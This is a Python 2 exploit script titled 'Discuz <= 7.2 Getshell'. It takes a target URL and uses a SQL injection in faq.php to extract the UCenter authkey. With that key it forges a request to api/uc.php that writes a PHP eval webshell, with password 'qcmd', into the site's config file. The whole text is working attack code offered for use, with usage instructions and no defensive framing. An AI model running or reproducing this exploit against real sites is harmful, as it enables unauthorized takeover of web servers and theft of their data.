    import sys,urllib,time,math,base64,hashlib,urllib2
    #contant raw
    def fg(kaishi, jieshu, wenben):
    start = wenben.find(kaishi);
    if start >= 0:
    start += len(kaishi);
    jieshu = wenben.find(jieshu, start);
    if jieshu >= 0:
    return wenben[start:jieshu].strip();
    #microtime
    def microtime(get_as_float = False) :
    if get_as_float:
    return time.time();
    else:
    return '%.8f %d' % math.modf(time.time());
    #authget
    def get_authcode(string, key = ''):
    ckey_length = 4;
    key = hashlib.md5(key).hexdigest();
    keya = hashlib.md5(key[0:16]).hexdigest();
    keyb = hashlib.md5(key[16:32]).hexdigest();
    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:];
    #keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest();
    key_length = len(cryptkey);
    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string;
    string_length = len(string);
    result = '';
    box = range(0, 256);
    rndkey = dict();
    for i in range(0,256):
    rndkey[i] = ord(cryptkey[i % key_length]);
    j=0;
    for i in range(0,256):
    j = (j + box[i] + rndkey[i]) % 256;
    tmp = box[i];
    box[i] = box[j];
    box[j] = tmp;
    a=0;
    j=0;
    for i in range(0,string_length):
    a = (a + 1) % 256;
    j = (j + box[a]) % 256;
    tmp = box[a];
    box[a] = box[j];
    box[j] = tmp;
    result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]));
    return keyc + base64.b64encode(result).replace('=', '');
    #getshell
    def get_shell(url0,key,host):
    headers={'Accept-Language':'zh-cn',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
    'Referer':url0
    };
    tm = time.time()+10*3600;
    tm="time=%d&action=updateapps" %tm;
    code = urllib.quote(get_authcode(tm,key));
    url0=url0+"?code="+code;
    data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
    <root>
    <item id="UC_API">http://xxx\');eval($_POST[qcmd]);//</item>
    </root>''';
    try:
    req=urllib2.Request(url0,data=data1,headers=headers);
    ret=urllib2.urlopen(req);
    except:
    return "error to read";
    data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
    <root>
    <item id="UC_API">http://aaa</item>
    </root>''';
    try:
    req=urllib2.Request(url0,data=data2,headers=headers);
    ret=urllib2.urlopen(req);
    except:
    return "error";
    return "OK: "+host+"/config.inc.php | Password = qcmd"; #È¥µô/config/uc_config.php Îªconfig.inc.php by niubl
    #define over
    #url from users
    right = len(sys.argv);
    if right < 2:
    #note
    print ("============================================================");
    print ("Discuz <= 7.2 Getshell");
    print ("Wrote by Airbasic");
    print ("Usage: py.exe " + sys.argv[0] + " http://localhost/dz");
    print ("============================================================");
    raw_input("");
    sys.exit()
    url = sys.argv[1];
     
    #go
    url1 = url + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,1,31) from cdb_uc_applications where appid =1))x from information_schema .tables group by x)a)%23";
    url2 = url + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,32,64) from cdb_uc_applications where appid =1))x from information_schema .tables group by x)a)%23";
    #authkey1~31
    wy1 = urllib.urlopen(url1);
    nr1 = wy1.read();
    authkey1 = fg("'1:","' for",nr1);
    #authkey32~64
    wy2 = urllib.urlopen(url2);
    nr2 = wy2.read();
    authkey2 = fg("'1:","' for",nr2);
    #authkey
    authkey = authkey1+authkey2;
    #get username and password
    #none
    #over
    #get webshell
    url0 = url + "/api/uc.php";
    host = url;
    print ("Wrote by Airbasic , GetShell Ok !");
    print get_shell(url0,authkey,host);
    raw_input("");